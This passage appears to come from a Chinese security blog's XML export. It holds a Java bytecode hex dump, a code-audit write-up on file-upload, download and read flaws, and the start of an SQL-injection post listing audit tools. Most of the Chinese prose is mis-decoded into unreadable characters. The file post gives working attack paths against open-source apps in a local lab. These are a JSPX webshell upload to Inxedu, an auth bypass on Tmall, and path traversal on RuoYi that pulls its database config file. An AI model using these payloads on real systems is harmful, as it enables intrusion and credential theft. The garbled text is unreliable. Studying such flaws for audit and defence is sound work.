class="line">000000e0  0b 68 65 6c 6c 6f 20 77  6f 72 6c 64 07 00 1f 0c  |.hello world....|</span><br><span class="line">000000f0  00 20 00 21 01 00 10 6f  72 67 2f 65 78 61 6d 70  |. .!...org/examp|</span><br><span class="line">00000100  6c 65 2f 4d 61 69 6e 01  00 10 6a 61 76 61 2f 6c  |le/Main...java/l|</span><br><span class="line">00000110  61 6e 67 2f 4f 62 6a 65  63 74 01 00 10 6a 61 76  |ang/Object...jav|</span><br><span class="line">00000120  61 2f 6c 61 6e 67 2f 53  79 73 74 65 6d 01 00 03  |a/lang/System...|</span><br><span class="line">00000130  6f 75 74 01 00 15 4c 6a  61 76 61 2f 69 6f 2f 50  |out...Ljava/io/P|</span><br><span class="line">00000140  72 69 6e 74 53 74 72 65  61 6d 3b 01 00 13 6a 61  |rintStream;...ja|</span><br><span class="line">00000150  76 61 2f 69 6f 2f 50 72  69 6e 74 53 74 72 65 61  |va/io/PrintStrea|</span><br><span class="line">00000160  6d 01 00 07 70 72 69 6e  74 6c 6e 01 00 15 28 4c  |m...println...(L|</span><br><span class="line">00000170  6a 61 76 61 2f 6c 61 6e  67 2f 53 74 72 69 6e 67  |java/lang/String|</span><br><span class="line">00000180  3b 29 56 00 21 00 05 00  06 00 00 00 00 00 02 00  |;)V.!...........|</span><br><span class="line">00000190  01 00 07 00 08 00 01 00  09 00 00 00 2f 00 01 00  |............/...|</span><br><span class="line">000001a0  01 00 00 00 05 2a b7 00  01 b1 00 00 00 02 00 0a  |.....*........|</span><br><span class="line">000001b0  00 00 00 06 00 01 00 00  00 05 00 0b 00 00 00 0c  |................|</span><br><span class="line">000001c0  00 01 00 00 00 05 00 0c  00 0d 00 00 00 09 00 0e  |................|</span><br><span class="line">000001d0  00 0f 00 01 00 09 00 00  00 37 00 02 00 01 00 00  |.........7......|</span><br><span class="line">000001e0  00 09 b2 00 02 12 03 b6  00 04 b1 00 00 00 02 00  |.............|</span><br><span class="line">000001f0  0a 00 00 00 0a 00 02 00  00 00 07 00 08 00 08 00  |................|</span><br><span class="line">00000200  0b 00 00 00 0c 00 01 00  00 00 09 00 10 00 11 00  |................|</span><br><span class="line">00000210  00 00 01 00 12 00 00 00  02 00 13                 |...........|</span><br><span class="line">0000021b</span><br></pre></td></tr></table></figure><p>ca fe ba beå°±æ˜¯.class,å­—èŠ‚ç çš„äºŒè¿›åˆ¶å†…å®¹å¯¹åº”ä¸ºè¿™é‡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2 00 02 12 03 b6 00 04 b1</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè¿™é‡Œæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶çš„ 16 è¿›åˆ¶è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯ hexï¼Œä¸€èˆ¬åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶éƒ½æ˜¯ä»¥ hex è¿›è¡Œåˆ†æã€‚å­—èŠ‚ç æŒ‡ä»¤å’ŒäºŒè¿›åˆ¶ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼Œä»¥åŠå¯¹åº”çš„è¯­ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xb2   getstatic       è·å–é™æ€å­—æ®µçš„å€¼</span><br><span class="line">0x12   ldc             å¸¸é‡æ± ä¸­çš„å¸¸é‡å€¼å…¥æ ˆ</span><br><span class="line">0xb6   invokevirtual   è¿è¡Œæ—¶æ–¹æ³•ç»‘å®šè°ƒç”¨æ–¹æ³•</span><br><span class="line">0xb1   return          void æ–¹æ³•è¿”å›</span><br></pre></td></tr></table></figure><p>JVM å°±æ˜¯é è§£æè¿™äº›å­—èŠ‚ç æŒ‡ä»¤æ¥å®Œæˆç¨‹åºæ‰§è¡Œçš„ã€‚å¸¸è§çš„æ‰§è¡Œæ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯è§£é‡Šæ‰§è¡Œï¼Œå¯¹å­—èŠ‚ç é€æ¡è§£é‡Šæ‰§è¡Œï¼›ä¸€ç§æ˜¯ <a href="https://javabetter.cn/jvm/jit.html">JIT</a>ï¼Œä¹Ÿå°±æ˜¯å³æ—¶ç¼–è¯‘ï¼Œå®ƒä¼šåœ¨è¿è¡Œæ—¶å°†çƒ­ç‚¹ä»£ç ä¼˜åŒ–å¹¶ç¼“å­˜èµ·æ¥ï¼Œä¸‹æ¬¡å†æ‰§è¡Œçš„æ—¶å€™ç›´æ¥ä½¿ç”¨ç¼“å­˜èµ·æ¥çš„æœºå™¨ç ï¼Œè€Œä¸éœ€è¦å†æ¬¡è§£é‡Šæ‰§è¡Œã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742456275516-5262c48b-f50f-42ab-808b-a72e7c353a97.png"></p><p>è¿™æ ·å°±å¯ä»¥æé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚</p><p>æ³¨æ„ï¼Œå½“<a href="https://javabetter.cn/jvm/class-load.html">ç±»åŠ è½½å™¨</a>å®Œæˆå­—èŠ‚ç æ•°æ®åŠ è½½ä»»åŠ¡åï¼ŒJVM åˆ’åˆ†äº†ä¸“é—¨çš„å†…å­˜åŒºåŸŸæ¥è£…è½½è¿™äº›å­—èŠ‚ç æ•°æ®ä»¥åŠè¿è¡Œæ—¶ä¸­é—´æ•°æ®ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaä»£ç å®¡è®¡-æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2024/11/02/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/11/02/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶å®‰å…¨-ä¸Šä¼ -ä¸‹è½½-è¯»å–-å†™å…¥ç­‰"><a href="#æ–‡ä»¶å®‰å…¨-ä¸Šä¼ -ä¸‹è½½-è¯»å–-å†™å…¥ç­‰" class="headerlink" title="æ–‡ä»¶å®‰å…¨-ä¸Šä¼ &amp;ä¸‹è½½&amp;è¯»å–&amp;å†™å…¥ç­‰"></a>æ–‡ä»¶å®‰å…¨-ä¸Šä¼ &amp;ä¸‹è½½&amp;è¯»å–&amp;å†™å…¥ç­‰</h1><p>1ã€æœç´¢ç±»åˆ«ï¼šä¸šåŠ¡å…³é”®å­—&amp;ç›¸å…³æ“ä½œç±»&amp;å°è£…å…³é”®å­—</p><p>2ã€åŠŸèƒ½ç‚¹ä¹Ÿé€‚ç”¨ï¼Œç›´æ¥æ‰¾æ–‡ä»¶æ“ä½œåŠŸèƒ½è¿›è¡Œä»£ç è¿½æº¯</p><p>newFile(</p><p>String path</p><p>String fileName</p><p>newFileInputStream(</p><p>newFileOutputStream(</p><p>newFileReader</p><p>response.setContentType(â€œapplication&#x2F;octet-stream;</p><p>file.delete();</p><p>FileUtils.</p><p>newZipEntity(</p><p>file.getName(</p><p>.unzip(</p><p>.mkdirs(</p><p>stream.write(</p><p>save2File(</p><p>fosã€fis.close()</p><p>MultipartFile(</p><p>file.getOriginalFilename(</p><p>IOUtil</p><p>FileUtil</p><p>download</p><p>fileName</p><p>filePath</p><p>write</p><p>getFile</p><p>getPath</p><p>getWriter</p><p>ä¸Šä¼  &#x2F;&#x2F; æœæ³¨é‡Š</p><p>ä¸‹è½½ &#x2F;&#x2F; æœæ³¨é‡Š</p><p>â€¦â€¦..</p><h2 id="æ–‡ä»¶ä¸Šä¼ -Inxedu"><a href="#æ–‡ä»¶ä¸Šä¼ -Inxedu" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ -Inxedu"></a>æ–‡ä»¶ä¸Šä¼ -Inxedu</h2><p>åŠŸèƒ½ç‚¹-&gt;å‰å°ä¸Šä¼ -&gt;ImageUploadController.class-&gt;gok4-&gt;fileType-&gt;jspx</p><p>&#x2F;image&#x2F;gok4?&amp;param&#x3D;temp&amp;fileType&#x3D;jspx,jpg,gif,png,jpeg</p><p>ä¿®æ”¹é…ç½®</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719068893048-2503cfef-9c3a-461a-acc9-7c09baacbd99.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719068930224-3a64836b-e172-4623-bd96-5d68e37c6aee.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069005095-f2f9fe37-4bc9-4d95-b566-7ad5d962ce0a.png"></p><p>å…ˆä¸Šåå°éšä¾¿æ‰¾ä¸ªç”¨æˆ·ï¼Œç™»é™†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069078849-4b0abd19-5061-4eab-8095-8395fd4e75f0.png"></p><p>ä¸Šä¼ å¤´åƒ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069212259-debbc115-311c-493e-98af-ee9a1ad9808a.png"></p><p>æŠ“åŒ…ï¼Œæå–ä¸Šä¼ æ•°æ®åŒ…</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719069326872-b4193e2b-73ba-49a9-af7b-b1da7a363c33.png"></p><p><a href="http://127.0.0.1:8282/image/gok4?&param=temp&fileType=jpg,gif,png,jpeg">http://127.0.0.1:8282/image/gok4?&amp;param=temp&amp;fileType=jpg,gif,png,jpeg</a></p><p>æœä¸Šé¢çš„è·¯å¾„ä¿¡æ¯ï¼Œæ²¡æ‰¾åˆ°ç›¸å…³ç±»ï¼ŒçŒœæµ‹è¢«å°è£…åˆ°jaråŒ…ä¸­ï¼Œæ‰¾é…ç½®æ–‡ä»¶çœ‹jarè¢«æ‰“åŒ…åˆ°å“ªé‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070033758-cdd4ecef-2a8a-4ce2-a9f5-83ebd59184ae.png"></p><p>æ‰¾åˆ°è·¯ç”±è·¯å¾„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070112741-acacfcfc-56a1-4ad2-a6b2-ca9b99f5fc86.png"></p><p>åˆ¤æ–­å¤§å°å’Œåˆ¤æ–­æ–‡ä»¶ä¸Šä¼ ç±»å‹fileType&#x3D;jpg,gif,png,jpegï¼Œå°†å‰ç«¯æ”¹ä¸ºfileType&#x3D;jspx,jpg,gif,png,jpeg</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070525953-f23a8ffe-4124-428b-a4a3-30f1664c5765.png"></p><p>getSuffixè·Ÿè¿›å»å‘ç°è¯¥å‡½æ•°æ˜¯è·å–æ–‡ä»¶åæœ€åä¸€ä¸ª.ä¹‹åçš„åç¼€ï¼Œå†å›åˆ°ä¹‹å‰ä»£ç ï¼Œåˆ¤æ–­åç¼€åï¼Œä¸ä¸ºjspæ‰æ‰§è¡Œæ¥ä¸‹æ¥çš„æµç¨‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070745710-e3e6e95d-bf97-4e5b-93e8-ed03698e226e.png"></p><p>æ€è·¯ç›´æ¥ä¸Šä¼ jspxåé—¨ï¼Œä¸Šå“¥æ–¯æ‹‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719070995094-fda056b6-1b84-45bb-9a8e-ba6fcb3f4868.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719071449393-abb607cf-cf5f-459d-ae29-a1bf93f29079.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719071466110-e0e7ec65-730c-430f-a2fe-864e568c7d82.png"></p><p>åå°é…ç½®ç¯å¢ƒæ—¶è®°å¾—ä¿®æ”¹ä¸Šä¼ æƒé™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719071612102-80b02309-7b22-414b-9bdd-0d6c8576e76c.png"></p><h2 id="é…åˆè¿‡æ»¤å™¨ä¸Šä¼ -Tmall"><a href="#é…åˆè¿‡æ»¤å™¨ä¸Šä¼ -Tmall" class="headerlink" title="é…åˆè¿‡æ»¤å™¨ä¸Šä¼ -Tmall"></a>é…åˆè¿‡æ»¤å™¨ä¸Šä¼ -Tmall</h2><p>1ã€æœnewFile(-&gt;filePath-&gt;fileName-&gt;extension-&gt;originalFileName-&gt;file</p><p>2ã€AdminPermissionFilter.java-&gt;doFilter-&gt;contains(â€œ&#x2F;admin&#x2F;loginâ€)</p><p>&#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;tmall&#x2F;admin&#x2F;uploadAdminHeadImage</p><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p>æœå…³é”®å­—</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719073243743-4de99772-f3f8-4ac0-8640-cf25a9704be4.png"></p><p>è·Ÿè¿›å»å‘ç°åç«¯æ–‡ä»¶æ²¡æœ‰è¿‡æ»¤</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719073485815-095c0b56-d12b-46bc-8324-1f8925442ab7.png"> å‰ç«¯æœ‰è¿‡æ»¤ï¼ŒæŠ“ä¸ªåŒ…ä¿®æ”¹åç¼€ç»•è¿‡å°±è¡Œã€‚</p><h3 id="é‰´æƒæ¼æ´"><a href="#é‰´æƒæ¼æ´" class="headerlink" title="é‰´æƒæ¼æ´"></a>é‰´æƒæ¼æ´</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719074030094-1892f6f1-25e9-4bb7-8689-4a7f81872c0a.png"></p><p>è¿™é‡Œä»£ç æœ‰é€»è¾‘é‰´æƒæ¼æ´ï¼Œåªè¦urlåŒ…å«&#x2F;admin&#x2F;loginå°±ä¸é‰´æƒäº†</p><p>&#x2F;admin&#x2F;login&#x2F;..&#x2F;..&#x2F;tmall&#x2F;admin&#x2F;uploadAdminHeadImage</p><p>è¿™æ ·å°±å¯ä»¥é…åˆå‰é¢çš„ä¸Šä¼ æ¼æ´</p><h2 id="æ–‡ä»¶ä¸‹è½½-Ruoyi"><a href="#æ–‡ä»¶ä¸‹è½½-Ruoyi" class="headerlink" title="æ–‡ä»¶ä¸‹è½½-Ruoyi"></a>æ–‡ä»¶ä¸‹è½½-Ruoyi</h2><p>æœFileInputStream-&gt;writeBytes-&gt;resourceDownload-&gt;resource</p><p>common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;..&#x2F;RuoYi-v4.5.0&#x2F;ruoyi-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application-druid.yml</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719131580668-3f95b971-4d95-4809-8e3b-056616c07191.png"></p><p>å¦‚æœä¸ç¡®å®šè·¯å¾„å˜é‡åæ˜¯ä»€ä¹ˆå¯ä»¥æ‰“å°çœ‹ä¸€ä¸‹</p><h2 id="æ–‡ä»¶è¯»å–-Oasys"><a href="#æ–‡ä»¶è¯»å–-Oasys" class="headerlink" title="æ–‡ä»¶è¯»å–-Oasys"></a>æ–‡ä»¶è¯»å–-Oasys</h2><p>æœç´¢new FileInputStream(-&gt;image-&gt;f.getPath()-&gt;path-&gt;startpath</p><p>&#x2F;image&#x2F;&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;image..&#x2F;&#x2F;IDEA.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719132728786-b439cbca-19ad-41b4-a3f0-472b8a9bc98e.png"></p><p>æŠŠä¸Šé¢åœ°å€éƒ½è¾“å‡ºæ‰“å°ç¡®å®šä¸€ä¸‹ï¼Œæ‰“å°å‡ºæ¥ä½ç½®ï¼Œç¡®å®šå’Œæƒ³è¦è¯»å–çš„æ–‡ä»¶ä½ç½®ä¹‹å‰çš„å…³ç³»ï¼Œè¿›è¡Œç»•è¿‡</p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é‰´æƒ</p><p>1ã€è¿‡æ»¤å™¨ï¼šçœ‹é€»è¾‘</p><p>2ã€è‡ªå®šä¹‰ä»£ç ï¼šçœ‹é€»è¾‘</p><p>3ã€shiroæ¡†æ¶ï¼šæ‰¾ç‰ˆæœ¬æ¼æ´ </p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaä»£ç å®¡è®¡-sqlæ³¨å…¥</title>
      <link href="/2024/11/01/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/01/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><p>JavaEEä»£ç å®¡è®¡ï¼š</p><p>ä¸€ã€ä»£ç ç¼–è¾‘å™¨ï¼š</p><p>1.Jetbrains IDEA(IDE)</p><p>2.Sublime text(æ–‡æœ¬ç¼–è¾‘å™¨)</p><p>3.Eclipse (IDE)</p><p>äºŒã€æµ‹è¯•å·¥å…·ï¼š</p><p>1.Burp Suiteï¼šæ˜¯æ¸—é€æµ‹è¯•å·¥ä½œè€…å¿…å¤‡çš„ä¸€æ¬¾å·¥å…·</p><p>2.SwitchyOmegaï¼šSwitchyOmega æ˜¯ä¸€æ¬¾ä»£ç†ç®¡ç†æ’ä»¶ï¼Œæ”¯æŒFirefoxå’ŒChromeæµè§ˆå™¨ï¼Œå¹¶æ”¯æŒHTTPã€HTTPSã€socket4å’Œsocket5åè®®ã€‚</p><p>3.Max HackerBarï¼šHackBaræ˜¯çš„ä¸€ä¸ªæ’ä»¶ï¼Œä¹Ÿæ˜¯ä¿¡æ¯å®‰å…¨ä»ä¸šè€…å¸¸ç”¨çš„ç»å…¸å·¥å…·ã€‚</p><p>4.Postmanï¼šPostmanæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„ç½‘é¡µè°ƒè¯•å·¥å…·ï¼Œèƒ½å¤Ÿä¸ºç”¨æˆ·æä¾›å¼ºå¤§çš„Web API &amp; HTTPè¯·æ±‚è°ƒè¯•åŠŸèƒ½ã€‚</p><p>5.Ysoserialï¼šä¸€æ¬¾å¼€æºJavaååºåˆ—åŒ–æµ‹è¯•å·¥å…·ï¼Œå†…éƒ¨é›†æˆæœ‰å¤šç§åˆ©ç”¨é“¾ï¼Œå¯ä»¥å¿«é€Ÿç”Ÿæˆç”¨äºæ”»å‡»çš„ä»£ç ï¼Œä¹Ÿå¯ä»¥å°†æ–°å…¬å¼€çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ–¹å¼è‡ªè¡ŒåŠ å…¥Ysoserialä¸­ã€‚</p><p>6.Marshalsecï¼šæ˜¯ä¸€æ¬¾å¼€æºçš„Javaååºåˆ—åŒ–æµ‹è¯•å·¥å…·ï¼Œä¸ä»…å¯ä»¥ç”Ÿæˆå„ç±»ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿˜å¯ä»¥å¿«é€Ÿå¯åŠ¨æ¶æ„çš„RMIæœåŠ¡ç­‰ã€‚</p><p>7.MySQL Monitorï¼šæ˜¯Webç‰ˆæœ¬çš„SQLè®°å½•å®æ—¶ç›‘æ§å·¥å…·ã€‚</p><p>8.Beyond Compareï¼šæ˜¯ä¸€æ¬¾æ–‡ä»¶æ¯”è¾ƒå·¥å…·ï¼Œä¸»è¦å¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶ï¼Œå¹¶ä»¥é¢œè‰²æ ‡ç¤ºå·®å¼‚ï¼Œæ¯”è¾ƒèŒƒå›´åŒ…æ‹¬ç›®å½•ã€æ–‡æ¡£å†…å®¹ç­‰ã€‚ä½¿ç”¨è¯¥å·¥å…·å¯ä»¥æ–¹ä¾¿ä»£ç å®¡è®¡äººå‘˜å¿«é€Ÿåœ°æ¯”å¯¹ä¸¤ä¸ªç‰ˆæœ¬ä»£ç çš„å·®åˆ«ã€‚</p><p>ä¸‰ã€åç¼–è¯‘å·¥å…·</p><p>1.JD-GUIï¼šæ˜¯ä¸€æ¬¾å…·æœ‰UIç•Œé¢çš„åç¼–è¯‘å·¥å…·ï¼Œç•Œé¢ç®€æ´å¤§æ–¹ï¼Œä½¿ç”¨ç®€å•æ–¹ä¾¿ã€‚</p><p>2.Fernflowerï¼šåŠŸèƒ½æ¯”JD-GUIæ›´å¼ºå¤§ï¼Œè™½ç„¶æ²¡æœ‰UIç•Œé¢ï¼Œä½†å¯ä»¥é…åˆç³»ç»ŸæŒ‡ä»¤å®Œæˆæ‰¹é‡åç¼–è¯‘çš„å·¥ä½œã€‚</p><p>3.CFRï¼šåŠŸèƒ½å¼ºå¤§çš„åç¼–è¯‘å·¥å…·ï¼Œæ”¯æŒä¸»æµJavaç‰¹æ€§â€”â€”Java8 lambdaè¡¨è¾¾å¼ï¼Œä»¥åŠJava7å­—ç¬¦ä¸²åˆ‡æ¢ã€‚åœ¨æŸäº›JD-GUIæ— æ³•åç¼–è¯‘çš„æƒ…å†µä¸‹ï¼ŒCFRä»ç„¶èƒ½å®Œç¾åœ°è¿›è¡Œåç¼–è¯‘ï¼Œä¹Ÿå¯ä»¥åƒFernFloweré‚£æ ·é…åˆç³»ç»ŸæŒ‡ä»¤è¿›è¡Œæ‰¹é‡åç¼–è¯‘ã€‚</p><p>4.IntelliJ IDEAï¼šå…·èƒ½å¤Ÿè‡ªåŠ¨è§£åŒ…å·²æ·»åŠ ä¾èµ–çš„JaråŒ…ï¼Œå¹¶å¯¹å…¶å†…å®¹è¿›è¡Œåç¼–è¯‘ã€‚è¯¥å·¥å…·æ‹¥æœ‰åŠ¨æ€è°ƒè¯•å’Œå­—ç¬¦ä¸²åŒ¹é…å’Œæœç´¢åŠŸèƒ½ï¼Œä¸ºå®¡è®¡å’Œè°ƒè¯•æ¼æ´å·¥ä½œæä¾›äº†æå¤§ä¾¿åˆ©ã€‚</p><p>5.CodeReviewToolsï¼šæ˜¯ä¸€æ¬¾å¯ä»¥å¿«é€Ÿæœç´¢ä»£ç ä¸­çš„å…³é”®ç‚¹ï¼Œä¸€é”®å¯¹jarè¿›è¡Œæ‰¹é‡åç¼–è¯‘ï¼Œä¹Ÿæ”¯æŒç›´æ¥å¯¹waråŒ…è¿›è¡Œæ“ä½œã€‚</p><p>å››ã€Javaä»£ç é™æ€æ‰«æå·¥å…·</p><p>1.Fortify SCAï¼šè·å¾—ä¸šç•Œè®¤å¯çš„é™æ€ä»£ç æ£€æŸ¥å·¥å…·ï¼Œä½†å®ƒæ˜¯æ”¶è´¹çš„ã€‚Fortify SCAçš„æ ¸å¿ƒåœ¨äºè§„åˆ™åº“ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰è§„åˆ™åº“ï¼Œå‡å°‘è¯¯æŠ¥ã€‚</p><p>2.VCGï¼šåŸºäº VB å¼€å‘çš„ä¸€æ¬¾Windowsä¸‹çš„ç™½ç›’å®¡è®¡å·¥å…·ã€‚VCG æ”¯æŒå¤šç§è¯­è¨€ï¼Œä¾‹å¦‚C&#x2F;C++ã€Javaã€C#ã€VBã€PL&#x2F;SQLã€PHPã€‚VCGä¼šæ ¹æ®ä»£ç ä¸­çš„å˜é‡åç­‰ä¿¡æ¯åŠ¨æ€ç”Ÿæˆé’ˆå¯¹è¯¥ä»£ç çš„æ¼æ´è§„åˆ™ï¼Œé€šè¿‡æ­£åˆ™æ£€æŸ¥æ˜¯å¦æœ‰å’Œæ¼æ´è§„åˆ™æ‰€åŒ¹é…çš„ä»£ç ã€‚</p><p>3.FindBugsä¸FindSecBugsæ’ä»¶ï¼šFindBugsæ˜¯ä¸€æ¬¾Bugæ‰«ææ’ä»¶ï¼Œåœ¨IDEAå’ŒEclipseä¸­éƒ½å¯è¿›è¡Œå®‰è£…ã€‚FindBugså¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜å‘ç°ä»£ç ç¼ºé™·ï¼Œå‡å°‘Bugï¼Œä½†å…¶æœ¬èº«å¹¶ä¸å…·å¤‡å‘ç°å®‰å…¨æ¼æ´çš„èƒ½åŠ›ï¼Œéœ€è¦å®‰è£…FindSecBugsæ‹“å±•å‘ç°å®‰å…¨æ¼æ´çš„èƒ½åŠ›ã€‚</p><p>4.SpotBugsï¼šæ˜¯FindBugsçš„ç»§ä»»è€…ï¼Œæ‰€ä»¥äºŒè€…ç”¨æ³•åŸºæœ¬ä¸€æ ·ï¼Œå¯ä»¥ç‹¬ç«‹ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæ’ä»¶ä½¿ç”¨ã€‚</p><p>5.CheckMarkï¼šç™½ç›’ä»£ç å®¡è®¡è§£å†³æ–¹æ¡ˆï¼Œä¸»è¦é€šè¿‡é‡‡ç”¨ç‹¬ç‰¹çš„è¯æ±‡åˆ†ææŠ€æœ¯å’ŒCxQLä¸“åˆ©æŸ¥è¯¢æŠ€æœ¯å¯¹åº”ç”¨ç¨‹åºæºç è¿›è¡Œé™æ€åˆ†ææ£€æŸ¥ã€‚</p><p>6.Snykæ’ä»¶ï¼šä¿®å¤é¡¹ç›®ä¸­çš„å®‰å…¨æ¼æ´ã€åŸºç¡€æ¶æ„é”™è¯¯é…ç½®å’Œä»£ç è´¨é‡é—®é¢˜ã€‚</p><p>7.Senseiæ’ä»¶ï¼šå¯åœ¨é”®å…¥æ—¶æ‰«æå’Œä¿®å¤æ˜“å—æ”»å‡»çš„ä»£ç  - å…·æœ‰æ•°ç™¾ä¸ªå¯ä¸‹è½½çš„å®‰å…¨ç¼–ç é…æ–¹ï¼ˆè§„åˆ™ï¼‰ä»¥åŠå†…ç½®çš„è‡ªè¡Œåˆ¶ä½œèƒ½åŠ›ã€‚</p><p>8.Reshift Securityæ’ä»¶ï¼šå¯ä»¥å¿«é€Ÿå‘ç°æ¼æ´ï¼Œæä¾›å¤šä¸ªä»£ç ä¿®å¤ç‰‡æ®µï¼Œä»¥åŠä¸°å¯Œçš„æ–‡æ¡£ï¼Œæ¶µç›–äº†æ¯ä¸ªæ¼æ´çš„æ£€æµ‹ã€ä¿®å¤å’Œæµ‹è¯•ã€‚</p><p>9.MurphySec CodeScanæ’ä»¶ï¼šå¯ä»¥å¿«é€Ÿè¯†åˆ«æ‚¨çš„é¡¹ç›®ä¸­ä½¿ç”¨äº†å“ªäº›å­˜åœ¨å®‰å…¨ç¼ºé™·çš„å¼€æºç»„ä»¶ï¼Œå¹¶å¸®åŠ©æ‚¨ä¸€é”®ä¿®å¤é—®é¢˜ã€‚</p><p>10.Momo CodeSecInspectoræ’ä»¶ï¼šé‡äºåœ¨ç¼–ç è¿‡ç¨‹ä¸­å‘ç°é¡¹ç›®æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå¹¶æä¾›ä¸€é”®ä¿®å¤èƒ½åŠ›ã€‚</p><p>11.dependence-checkï¼šå¯ç”¨äºæ£€æŸ¥å·²å‘å¸ƒå®‰å…¨æ¼æ´çš„é¡¹ç›®ä¾èµ–é¡¹ã€‚</p><p>12.wJaï¼šä¸€æ¬¾ç»“åˆDASTã€SASTã€IASTçš„ç»¼åˆæ€§åº”ç”¨ç¨‹åºå®‰å…¨åˆ†æå·¥å…·ï¼Œæ”¯æŒå¯¹java webç¨‹åºçš„å®‰å…¨æ€§è¿›è¡Œåˆ†æï¼Œå«æœ‰åç¼–è¯‘ï¼Œä»£ç å®¡è®¡ï¼Œè°ƒè¯•jaråŒ…ï¼Œä»£ç†è¿½è¸ªç­‰ç”¨äºåˆ†æè½¯ä»¶å®‰å…¨çš„åŠŸèƒ½ã€‚</p><p>13.tabbyï¼šæ˜¯ä¸€æ¬¾é’ˆå¯¹Javaè¯­è¨€çš„é™æ€ä»£ç åˆ†æå·¥å…·ï¼Œå®ƒä½¿ç”¨é™æ€åˆ†ææ¡†æ¶ Soot 